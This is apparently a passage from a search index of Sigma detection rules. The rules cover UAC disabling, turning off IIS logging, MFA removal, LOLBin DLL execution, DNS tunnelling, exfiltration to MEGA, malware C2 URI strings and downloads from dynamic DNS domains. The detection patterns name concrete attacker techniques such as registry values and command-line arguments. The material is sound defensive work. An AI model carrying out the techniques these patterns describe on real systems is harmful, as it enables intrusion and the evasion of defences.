0\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-8---disable-uac-using-regexe Raw rule (edit) title: Disable UAC Using Registry id: 48437c39-9e5f-47fb-af95-3d663c3f2919 description: Disable User Account Conrol (UAC) by changing its registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0 author: frack113 date: 2022/01/05 status: experimental references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-8---disable-uac-using-regexe logsource: category: registry_event product: windows detection: selection: EventType: SetValue TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA Details: DWORD (0x00000000) condition: selection falsepositives: - Unknown level: medium tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1548.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_disable_uac_registry.yml/","tags":["attack.privilege_escalation","attack.defense_evasion","attack.t1548.002"],"title":"Disable UAC Using Registry"},{"categories":null,"contents":"Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union)\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.md#atomic-test-1---disable-windows-iis-http-logging Raw rule (edit) title: Disable Windows IIS HTTP Logging id: e4ed6030-ffe5-4e6a-8a8a-ab3c1ab9d94e status: experimental description: Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union) author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.md#atomic-test-1---disable-windows-iis-http-logging date: 2022/01/09 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\appcmd.exe CommandLine|contains|all: - set - config - \u0026#39;/section:httplogging\u0026#39; - \u0026#39;/dontLog:true\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_iis_http_logging.yml/","tags":["attack.defense_evasion","attack.t1562.002"],"title":"Disable Windows IIS HTTP Logging"},{"categories":null,"contents":"Detection for when multi factor authentication has been disabled, which might indicate a malicious activity to bypass authentication mechanisms.\nKnown false-positives Authorized modification by administrators References https://attack.mitre.org/techniques/T1556/ https://docs.microsoft.com/en-us/azure/active-directory/authentication/howto-mfa-userstates Raw rule (edit) title: Disabled MFA to Bypass Authentication Mechanisms id: 7ea78478-a4f9-42a6-9dcd-f861816122bf status: experimental description: Detection for when multi factor authentication has been disabled, which might indicate a malicious activity to bypass authentication mechanisms. author: \u0026#39;@ionsor\u0026#39; date: 2022/02/08 references: - https://attack.mitre.org/techniques/T1556/ - https://docs.microsoft.com/en-us/azure/active-directory/authentication/howto-mfa-userstates logsource: category: azure product: azure.activitylogs detection: selection: eventSource: AzureActiveDirectory eventName: \u0026#39;Disable Strong Authentication.\u0026#39; status: success condition: selection falsepositives: - Authorized modification by administrators level: medium tags: - attack.persistence - attack.t1556 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/azure/azure_mfa_disabled.yml/","tags":["attack.persistence","attack.t1556"],"title":"Disabled MFA to Bypass Authentication Mechanisms"},{"categories":null,"contents":"Detects failed logins with multiple disabled domain accounts from a single source system using the Kerberos protocol.\nKnown false-positives Vulnerability scanners Misconfigured systems Remote administration tools VPN terminators Multiuser systems like Citrix server farms References https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying Raw rule (edit) title: Disabled Users Failing To Authenticate From Source Using Kerberos id: 4b6fe998-b69c-46d8-901b-13677c9fb663 description: Detects failed logins with multiple disabled domain accounts from a single source system using the Kerberos protocol. status: experimental author: Mauricio Velazco, frack113 date: 2021/06/01 modified: 2021/07/06 references: - https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection: EventID: 4768 Status: \u0026#39;0x12\u0026#39; filter_computer: TargetUserName|endswith: \u0026#39;$\u0026#39; timeframe: 24h condition: - selection and not filter_computer | count(TargetUserName) by IpAddress \u0026gt; 10 falsepositives: - Vulnerability scanners - Misconfigured systems - Remote administration tools - VPN terminators - Multiuser systems like Citrix server farms level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_failed_logons_single_source_kerberos2.yml/","tags":["attack.t1110.003","attack.initial_access","attack.privilege_escalation"],"title":"Disabled Users Failing To Authenticate From Source Using Kerberos"},{"categories":null,"contents":"Detects commands that temporarily turn off Volume Snapshots\nKnown false-positives Legitimate administration References https://twitter.com/0gtweet/status/1354766164166115331 Raw rule (edit) title: Disabled Volume Snapshots id: dee4af55-1f22-4e1d-a9d2-4bdc7ecb472a description: Detects commands that temporarily turn off Volume Snapshots references: - https://twitter.com/0gtweet/status/1354766164166115331 date: 2021/01/28 status: experimental author: Florian Roth tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;reg\u0026#39; - \u0026#39; add \u0026#39; - \u0026#39;\\Services\\VSS\\Diag\u0026#39; - \u0026#39;/d Disabled\u0026#39; condition: selection falsepositives: - Legitimate administration level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_volsnap_disable.yml/","tags":["attack.defense_evasion","attack.t1562.001"],"title":"Disabled Volume Snapshots"},{"categories":null,"contents":"Detects the use of Ditsnap tool. Seems to be a tool for ransomware groups.\nKnown false-positives Legitimate admin usage References https://thedfirreport.com/2020/06/21/snatch-ransomware/ https://github.com/yosqueoy/ditsnap Raw rule (edit) title: DIT Snapshot Viewer Use id: d3b70aad-097e-409c-9df2-450f80dc476b status: test description: Detects the use of Ditsnap tool. Seems to be a tool for ransomware groups. author: \u0026#39;Furkan Caliskan (@caliskanfurkan_)\u0026#39; references: - https://thedfirreport.com/2020/06/21/snatch-ransomware/ - https://github.com/yosqueoy/ditsnap date: 2020/07/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\ditsnap.exe\u0026#39; selection2: CommandLine|contains: - \u0026#39;ditsnap.exe\u0026#39; condition: selection or selection2 falsepositives: - Legitimate admin usage level: high tags: - attack.credential_access - attack.t1003.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_ditsnap.yml/","tags":["attack.credential_access","attack.t1003.003"],"title":"DIT Snapshot Viewer Use"},{"categories":null,"contents":"Detects suspicious Django web application framework exceptions that could indicate exploitation attempts\nKnown false-positives Application bugs Penetration testing References https://docs.djangoproject.com/en/1.11/ref/exceptions/ https://docs.djangoproject.com/en/1.11/topics/logging/#django-security Raw rule (edit) title: Django Framework Exceptions id: fd435618-981e-4a7c-81f8-f78ce480d616 status: stable description: Detects suspicious Django web application framework exceptions that could indicate exploitation attempts author: Thomas Patzke date: 2017/08/05 modified: 2020/09/01 references: - https://docs.djangoproject.com/en/1.11/ref/exceptions/ - https://docs.djangoproject.com/en/1.11/topics/logging/#django-security logsource: category: application product: django detection: keywords: - SuspiciousOperation # Subclasses of SuspiciousOperation - DisallowedHost - DisallowedModelAdminLookup - DisallowedModelAdminToField - DisallowedRedirect - InvalidSessionKey - RequestDataTooBig - SuspiciousFileOperation - SuspiciousMultipartForm - SuspiciousSession - TooManyFieldsSent # Further security-related exceptions - PermissionDenied condition: keywords falsepositives: - Application bugs - Penetration testing level: medium tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/django/appframework_django_exceptions.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Django Framework Exceptions"},{"categories":null,"contents":"Detects using Rasautou.exe for loading arbitrary .DLL specified in -d option and executes the export specified in -p.\nKnown false-positives Unlikely References https://lolbas-project.github.io/lolbas/Binaries/Rasautou/ https://github.com/fireeye/DueDLLigence https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html Raw rule (edit) title: DLL Execution via Rasautou.exe id: cd3d1298-eb3b-476c-ac67-12847de55813 status: test description: Detects using Rasautou.exe for loading arbitrary .DLL specified in -d option and executes the export specified in -p. author: Julia Fomina, oscd.community references: - https://lolbas-project.github.io/lolbas/Binaries/Rasautou/ - https://github.com/fireeye/DueDLLigence - https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html date: 2020/10/09 modified: 2021/11/27 logsource: product: windows category: process_creation definition: Since options \u0026#39;-d\u0026#39; and \u0026#39;-p\u0026#39; were removed in Windows 10 this rule is relevant only for Windows before 10. And as Windows 7 doesn\u0026#39;t log command line in 4688 by default, to detect this attack you need Sysmon 1 configured or KB3004375 installed for command-line auditing (https://support.microsoft.com/en-au/help/3004375/microsoft-security-advisory-update-to-improve-windows-command-line-aud) detection: use_rasautou: Image|endswith: \u0026#39;\\rasautou.exe\u0026#39; remaned_rasautou: OriginalFileName: \u0026#39;rasdlui.exe\u0026#39; special_keys: CommandLine|contains|all: - \u0026#39;-d\u0026#39; - \u0026#39;-p\u0026#39; condition: (use_rasautou or remaned_rasautou) and special_keys falsepositives: - Unlikely level: medium tags: - attack.defense_evasion - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_rasautou_dll_execution.yml/","tags":["attack.defense_evasion","attack.t1218"],"title":"DLL Execution via Rasautou.exe"},{"categories":null,"contents":"Detects using register-cimprovider.exe to execute arbitrary dll file.\nKnown false-positives Unknown References https://twitter.com/PhilipTsukerman/status/992021361106268161 https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Register-cimprovider.md Raw rule (edit) title: DLL Execution Via Register-cimprovider.exe id: a2910908-e86f-4687-aeba-76a5f996e652 status: test description: Detects using register-cimprovider.exe to execute arbitrary dll file. author: Ivan Dyachkov, Yulia Fomina, oscd.community references: - https://twitter.com/PhilipTsukerman/status/992021361106268161 - https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Register-cimprovider.md date: 2020/10/07 modified: 2021/11/27 logsource: category: process_creation product: windows definition: \u0026#39;Requirements: Sysmon ProcessCreation logging must be activated and Windows audit msut Include command line in process creation events\u0026#39; detection: selection: Image|endswith: \u0026#39;\\register-cimprovider.exe\u0026#39; CommandLine|contains|all: - \u0026#39;-path\u0026#39; - \u0026#39;dll\u0026#39; condition: selection fields: - CommandLine falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1574 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_register_cimprovider.yml/","tags":["attack.defense_evasion","attack.t1574"],"title":"DLL Execution Via Register-cimprovider.exe"},{"categories":null,"contents":"This rule detects DLL injection and execution via LOLBAS - Tracker.exe\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Tracker.yml Raw rule (edit) title: DLL Injection with Tracker.exe id: 148431ce-4b70-403d-8525-fcc2993f29ea status: test description: This rule detects DLL injection and execution via LOLBAS - Tracker.exe author: \u0026#39;Avneet Singh @v3t0_, oscd.community\u0026#39; references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Tracker.yml date: 2020/10/18 modified: 2021/11/27 logsource: category: process_creation product: windows detection: process_name: Image|endswith: - \u0026#39;\\tracker.exe\u0026#39; process_description: Description: - \u0026#39;Tracker\u0026#39; commandline_param1: CommandLine|contains: - \u0026#39; /d \u0026#39; commandline_param2: CommandLine|contains: - \u0026#39; /c \u0026#39; condition: (process_name or process_description) and commandline_param1 and commandline_param2 falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1055.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_tracker_execution.yml/","tags":["attack.defense_evasion","attack.t1055.001"],"title":"DLL Injection with Tracker.exe"},{"categories":null,"contents":"Detects Dllhost that communicates with public IP addresses\nKnown false-positives Communication to other corporate systems that use IP addresses from public address spaces References https://github.com/Neo23x0/sigma/blob/master/rules/windows/network_connection/sysmon_rundll32_net_connections.yml Raw rule (edit) title: Dllhost Internet Connection id: cfed2f44-16df-4bf3-833a-79405198b277 status: test description: Detects Dllhost that communicates with public IP addresses author: bartblaze references: - https://github.com/Neo23x0/sigma/blob/master/rules/windows/network_connection/sysmon_rundll32_net_connections.yml date: 2020/07/13 modified: 2021/12/07 logsource: category: network_connection product: windows detection: selection: Image|endswith: \u0026#39;\\dllhost.exe\u0026#39; Initiated: \u0026#39;true\u0026#39; filter: DestinationIp|startswith: - \u0026#39;10.\u0026#39; - \u0026#39;192.168.\u0026#39; - \u0026#39;172.16.\u0026#39; - \u0026#39;172.17.\u0026#39; - \u0026#39;172.18.\u0026#39; - \u0026#39;172.19.\u0026#39; - \u0026#39;172.20.\u0026#39; - \u0026#39;172.21.\u0026#39; - \u0026#39;172.22.\u0026#39; - \u0026#39;172.23.\u0026#39; - \u0026#39;172.24.\u0026#39; - \u0026#39;172.25.\u0026#39; - \u0026#39;172.26.\u0026#39; - \u0026#39;172.27.\u0026#39; - \u0026#39;172.28.\u0026#39; - \u0026#39;172.29.\u0026#39; - \u0026#39;172.30.\u0026#39; - \u0026#39;172.31.\u0026#39; filter2: DestinationIp: - \u0026#39;0:0:0:0:0:0:0:1\u0026#39; condition: selection and not 1 of filter* falsepositives: - Communication to other corporate systems that use IP addresses from public address spaces level: medium tags: - attack.defense_evasion - attack.t1218 - attack.execution - attack.t1559.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_dllhost_net_connections.yml/","tags":["attack.defense_evasion","attack.t1218","attack.execution","attack.t1559.001"],"title":"Dllhost Internet Connection"},{"categories":null,"contents":"Detects Azure Hybrid Connection Manager services querying the Azure service bus service\nKnown false-positives Legitimate use of Azure Hybrid Connection Manager and the Azure Service Bus service References https://twitter.com/Cyb3rWard0g/status/1381642789369286662 Raw rule (edit) title: DNS HybridConnectionManager Service Bus id: 7bd3902d-8b8b-4dd4-838a-c6862d40150d description: Detects Azure Hybrid Connection Manager services querying the Azure service bus service status: experimental date: 2021/04/12 modified: 2021/06/10 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.persistence - attack.t1554 references: - https://twitter.com/Cyb3rWard0g/status/1381642789369286662 logsource: product: windows category: dns_query detection: selection: QueryName|contains: servicebus.windows.net Image|contains: HybridConnectionManager condition: selection falsepositives: - Legitimate use of Azure Hybrid Connection Manager and the Azure Service Bus service level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/dns_query/dns_query_win_hybridconnectionmgr_servicebus.yml/","tags":["attack.persistence","attack.t1554"],"title":"DNS HybridConnectionManager Service Bus"},{"categories":null,"contents":"Detects DNS queries for subdomains used for upload to MEGA.io\nKnown false-positives Legitimate Mega upload References https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/ Raw rule (edit) title: DNS Query for MEGA.io Upload Domain id: 613c03ba-0779-4a53-8a1f-47f914a4ded3 description: Detects DNS queries for subdomains used for upload to MEGA.io status: experimental date: 2021/05/26 author: Aaron Greetham (@beardofbinary) - NCC Group references: - https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/ tags: - attack.exfiltration - attack.t1567.002 falsepositives: - Legitimate Mega upload level: high logsource: product: windows category: dns_query detection: dns_request: QueryName|contains: userstorage.mega.co.nz condition: dns_request ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/dns_query/dns_query_win_mega_nz.yml/","tags":["attack.exfiltration","attack.t1567.002"],"title":"DNS Query for MEGA.io Upload Domain"},{"categories":null,"contents":"This rule detects a DNS server error in which a specified plugin DLL (in registry) could not be loaded\nKnown false-positives Unknown References https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83 https://technet.microsoft.com/en-us/library/cc735829(v=ws.10).aspx https://twitter.com/gentilkiwi/status/861641945944391680 Raw rule (edit) title: DNS Server Error Failed Loading the ServerLevelPluginDLL id: cbe51394-cd93-4473-b555-edf0144952d9 status: test description: This rule detects a DNS server error in which a specified plugin DLL (in registry) could not be loaded author: Florian Roth references: - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83 - https://technet.microsoft.com/en-us/library/cc735829(v=ws.10).aspx - https://twitter.com/gentilkiwi/status/861641945944391680 date: 2017/05/08 modified: 2021/11/27 logsource: product: windows service: dns-server detection: selection: EventID: - 150 - 770 condition: selection falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.t1574.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/dns_server/win_susp_dns_config.yml/","tags":["attack.defense_evasion","attack.t1574.002"],"title":"DNS Server Error Failed Loading the ServerLevelPluginDLL"},{"categories":null,"contents":"Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server (restart required)\nKnown false-positives unknown References https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83 Raw rule (edit) title: DNS ServerLevelPluginDll Install id: e61e8a88-59a9-451c-874e-70fcc9740d67 status: experimental description: Detects the installation of a plugin DLL via ServerLevelPluginDll parameter in Registry, which can be used to execute code in context of the DNS server (restart required) references: - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83 date: 2017/05/08 modified: 2021/09/12 author: Florian Roth tags: - attack.defense_evasion - attack.t1574.002 - attack.t1112 logsource: product: windows category: registry_event detection: dnsregmod: TargetObject|endswith: \u0026#39;\\services\\DNS\\Parameters\\ServerLevelPluginDll\u0026#39; condition: dnsregmod falsepositives: - unknown level: high fields: - EventID - CommandLine - ParentCommandLine - Image - User - TargetObject ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_dns_serverlevelplugindll.yml/","tags":["attack.defense_evasion","attack.t1574.002","attack.t1112"],"title":"DNS ServerLevelPluginDll Install"},{"categories":null,"contents":"Detecting DNS tunnel activity for Muddywater actor\nKnown false-positives Unknown References https://www.virustotal.com/gui/file/5ad401c3a568bd87dd13f8a9ddc4e450ece61cd9ce4d1b23f68ce0b1f3c190b7/ https://www.vmray.com/analyses/5ad401c3a568/report/overview.html Raw rule (edit) title: DNS Tunnel Technique from MuddyWater id: 36222790-0d43-4fe8-86e4-674b27809543 status: test description: Detecting DNS tunnel activity for Muddywater actor author: \u0026#39;@caliskanfurkan_\u0026#39; references: - https://www.virustotal.com/gui/file/5ad401c3a568bd87dd13f8a9ddc4e450ece61cd9ce4d1b23f68ce0b1f3c190b7/ - https://www.vmray.com/analyses/5ad401c3a568/report/overview.html date: 2020/06/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\powershell.exe\u0026#39; ParentImage|endswith: - \u0026#39;\\excel.exe\u0026#39; CommandLine|contains: - \u0026#39;DataExchange.dll\u0026#39; condition: selection falsepositives: - Unknown level: critical tags: - attack.command_and_control - attack.t1071.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_muddywater_dnstunnel.yml/","tags":["attack.command_and_control","attack.t1071.004"],"title":"DNS Tunnel Technique from MuddyWater"},{"categories":null,"contents":"Detects strings used in command execution in DNS TXT Answer\nKnown false-positives Unknown References https://twitter.com/stvemillertime/status/1024707932447854592 https://github.com/samratashok/nishang/blob/master/Backdoors/DNS_TXT_Pwnage.ps1 Raw rule (edit) title: DNS TXT Answer with Possible Execution Strings id: 8ae51330-899c-4641-8125-e39f2e07da72 status: test description: Detects strings used in command execution in DNS TXT Answer author: Markus Neis references: - https://twitter.com/stvemillertime/status/1024707932447854592 - https://github.com/samratashok/nishang/blob/master/Backdoors/DNS_TXT_Pwnage.ps1 date: 2018/08/08 modified: 2021/11/27 logsource: category: dns detection: selection: record_type: \u0026#39;TXT\u0026#39; answer|contains: - \u0026#39;IEX\u0026#39; - \u0026#39;Invoke-Expression\u0026#39; - \u0026#39;cmd.exe\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1071.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_susp_dns_txt_exec_strings.yml/","tags":["attack.command_and_control","attack.t1071.004"],"title":"DNS TXT Answer with Possible Execution Strings"},{"categories":null,"contents":"Domain user and group enumeration via network reconnaissance. Seen in APT 29 and other common tactics and actors. Detects a set of RPC (remote procedure calls) used to enumerate a domain controller. The rule was created based off the datasets and hackathon from https://github.com/OTRF/detection-hackathon-apt29\nKnown false-positives Devices that may do authentication like a VPN or a firewall that looksup IPs to username False positives depend on scripts and administrative tools used in the monitored environment References https://github.com/OTRF/detection-hackathon-apt29 https://github.com/OTRF/detection-hackathon-apt29/issues/37 Raw rule (edit) title: Domain User Enumeration Network Recon 01 description: Domain user and group enumeration via network reconnaissance. Seen in APT 29 and other common tactics and actors. Detects a set of RPC (remote procedure calls) used to enumerate a domain controller. The rule was created based off the datasets and hackathon from https://github.com/OTRF/detection-hackathon-apt29 id: 66a0bdc6-ee04-441a-9125-99d2eb547942 references: - https://github.com/OTRF/detection-hackathon-apt29 - https://github.com/OTRF/detection-hackathon-apt29/issues/37 author: \u0026#39;Nate Guagenti (@neu5ron), Open Threat Research (OTR)\u0026#39; date: 2020/05/03 modified: 2021/11/14 tags: - attack.discovery - attack.t1087.002 - attack.t1082 logsource: product: zeek service: dce_rpc detection: selection: operation: #- LsarEnumerateTrustedDomains #potentially too many FPs, removing. caused by netlogon #- SamrEnumerateDomainsInSamServer #potentially too many FPs, removing. #method obtains a listing of all domains hosted by the server side of this protocol. This value is a cookie that the server can use to continue an enumeration on a subsequent call - LsarLookupNames3 #method translates a batch of security principal names to their SID form - LsarLookupSids3 #translates a batch of security principal SIDs to their name forms - SamrGetGroupsForUser #obtains a listing of groups that a user is a member of - SamrLookupIdsInDomain #method translates a set of RIDs into account names - SamrLookupNamesInDomain #method translates a set of account names into a set of RIDs - SamrQuerySecurityObject #method queries the access control on a server, domain, user, group, or alias object - SamrQueryInformationGroup #obtains attributes from a group object timeframe: 30s condition: selection | count(operation) by src_ip \u0026gt; 4 falsepositives: - Devices that may do authentication like a VPN or a firewall that looksup IPs to username - False positives depend on scripts and administrative tools used in the monitored environment level: medium status: experimental ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_dce_rpc_domain_user_enumeration.yml/","tags":["attack.discovery","attack.t1087.002","attack.t1082"],"title":"Domain User Enumeration Network Recon 01"},{"categories":null,"contents":"Detects specific malware patterns used by FurBall malware linked to Iranian Domestic Kitten APT group\nKnown false-positives Unlikely References https://research.checkpoint.com/2021/domestic-kitten-an-inside-look-at-the-iranian-surveillance-operations/ Raw rule (edit) title: Domestic Kitten FurBall Malware Pattern id: 6c939dfa-c710-4e12-a4dd-47e1f10e68e1 status: experimental description: Detects specific malware patterns used by FurBall malware linked to Iranian Domestic Kitten APT group author: Florian Roth references: - https://research.checkpoint.com/2021/domestic-kitten-an-inside-look-at-the-iranian-surveillance-operations/ date: 2021/02/08 tags: - attack.command_and_control logsource: category: proxy detection: selection: c-uri|contains: - \u0026#39;Get~~~AllBrowser\u0026#39; - \u0026#39;Get~~~HardwareInfo\u0026#39; - \u0026#39;Take~~RecordCall\u0026#39; - \u0026#39;Reset~~~AllCommand\u0026#39; condition: selection fields: - c-ip - c-uri falsepositives: - Unlikely level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/proxy/proxy_apt_domestic_kitten.yml/","tags":["attack.command_and_control"],"title":"Domestic Kitten FurBall Malware Pattern"},{"categories":null,"contents":"dotnet.exe will execute any DLL and execute unsigned code\nKnown false-positives System administrator Usage Penetration test References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dotnet.yml https://twitter.com/_felamos/status/1204705548668555264 https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/ Raw rule (edit) title: Dotnet.exe Exec Dll and Execute Unsigned Code LOLBIN id: d80d5c81-04ba-45b4-84e4-92eba40e0ad3 status: test description: dotnet.exe will execute any DLL and execute unsigned code author: Beyu Denis, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dotnet.yml - https://twitter.com/_felamos/status/1204705548668555264 - https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/ date: 2020/10/18 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|endswith: - \u0026#39;.dll\u0026#39; - \u0026#39;.csproj\u0026#39; Image|endswith: - \u0026#39;\\dotnet.exe\u0026#39; condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - System administrator Usage - Penetration test level: medium tags: - attack.execution - attack.t1218 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_dotnet.yml/","tags":["attack.execution","attack.t1218"],"title":"Dotnet.exe Exec Dll and Execute Unsigned Code LOLBIN"},{"categories":null,"contents":"Detects download of certain file types from hosts with dynamic DNS names (selected list)\nKnown false-positives Software downloads References https://www.alienvault.com/blogs/security-essentials/dynamic-dns-security-and-potential-threats Raw rule (edit) title: Download from Suspicious Dyndns Hosts id: 195c1119-ef07-4909-bb12-e66f5e07bf3c status: test description: Detects download of certain file types from hosts with dynamic DNS names (selected list) author: Florian Roth references: - https://www.alienvault.com/blogs/security-essentials/dynamic-dns-security-and-potential-threats date: 2017/11/08 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri-extension: - \u0026#39;exe\u0026#39; - \u0026#39;vbs\u0026#39; - \u0026#39;bat\u0026#39; - \u0026#39;rar\u0026#39; - \u0026#39;ps1\u0026#39; - \u0026#39;doc\u0026#39; - \u0026#39;docm\u0026#39; - \u0026#39;xls\u0026#39; - \u0026#39;xlsm\u0026#39; - \u0026#39;pptm\u0026#39; - \u0026#39;rtf\u0026#39; - \u0026#39;hta\u0026#39; - \u0026#39;dll\u0026#39; - \u0026#39;ws\u0026#39; - \u0026#39;wsf\u0026#39; - \u0026#39;sct\u0026#39; - \u0026#39;zip\u0026#39; # If you want to add more extensions - see https://docs.google.com/spreadsheets/d/1TWS238xacAto-fLKh1n5uTsdijWdCEsGIM0Y0Hvmc5g/ r-dns|endswith: - \u0026#39;.hopto.org\u0026#39; - \u0026#39;.no-ip.org\u0026#39; - \u0026#39;.no-ip.info\u0026#39; - \u0026#39;.no-ip.biz\u0026#39; - \u0026#39;.no-ip.com\u0026#39; - \u0026#39;.noip.com\u0026#39; - \u0026#39;.ddns.name\u0026#39; - \u0026#39;.myftp.org\u0026#39; - \u0026#39;.myftp.biz\u0026#39; - \u0026#39;.serveblog.net\u0026#39; - \u0026#39;.servebeer.com\u0026#39; - \u0026#39;.servemp3.com\u0026#39; - \u0026#39;.serveftp.com\u0026#39; - \u0026#39;.servequake.com\u0026#39; - \u0026#39;.servehalflife.com\u0026#39; - \u0026#39;.servehttp.com\u0026#39; - \u0026#39;.servegame.com\u0026#39; - \u0026#39;.servepics.com\u0026#39; - \u0026#39;.myvnc.com\u0026#39; - \u0026#39;.ignorelist.com\u0026#39; - \u0026#39;.jkub.com\u0026#39; - \u0026#39;.dlinkddns.com\u0026#39; - \u0026#39;.jumpingcrab.com\u0026#39; - \u0026#39;.ddns.info\u0026#39; - \u0026#39;.mooo.com\u0026#39; - \u0026#39;.dns-dns.com\u0026#39; - \u0026#39;.strangled.net\u0026#39; - \u0026#39;.adultdns.net\u0026#39; - \u0026#39;.craftx.biz\u0026#39; - \u0026#39;.ddns01.com\u0026#39; - \u0026#39;.dns53.biz\u0026#39; - \u0026#39;.dnsapi.info\u0026#39; - \u0026#39;.dnsd.info\u0026#39; - \u0026#39;.dnsdynamic.com\u0026#39; - \u0026#39;.dnsdynamic.net\u0026#39; - \u0026#39;.dnsget.org\u0026#39; - \u0026#39;.fe100.net\u0026#39; - \u0026#39;.flashserv.net\u0026#39; - \u0026#39;.ftp21.net\u0026#39; - \u0026#39;.http01.com\u0026#39; - \u0026#39;.http80.info\u0026#39; - \u0026#39;.https443.com\u0026#39; - \u0026#39;.imap01.com\u0026#39; - \u0026#39;.kadm5.com\u0026#39; - \u0026#39;.mysq1.net\u0026#39; - \u0026#39;.ns360.info\u0026#39; - \u0026#39;.ntdll.net\u0026#39; - \u0026#39;.ole32.com\u0026#39; - \u0026#39;.proxy8080.com\u0026#39; - \u0026#39;.sql01.com\u0026#39; - \u0026#39;.ssh01.com\u0026#39; - \u0026#39;.ssh22.net\u0026#39; - \u0026#39;.tempors.com\u0026#39; - \u0026#39;.tftpd.net\u0026#39; - \u0026#39;.ttl60.com\u0026#39; - \u0026#39;.ttl60.org\u0026#39; - \u0026#39;.user32.com\u0026#39; - \u0026#39;.voip01.com\u0026#39; - \u0026#39;.wow64.net\u0026#39; - \u0026#39;.x64.me\u0026#39; - \u0026#39;.xns01.com\u0026#39; - \u0026#39;.dyndns.org\u0026#39; - \u0026#39;.dyndns.info\u0026#39; - \u0026#39;.dyndns.tv\u0026#39; - \u0026#39;.dyndns-at-home.com\u0026#39; - \u0026#39;.dnsomatic.com\u0026#39; - \u0026#39;.zapto.org\u0026#39; - \u0026#39;.webhop.net\u0026#39; - \u0026#39;.25u.com\u0026#39; - \u0026#39;.slyip.net\u0026#39; condition: selection fields: 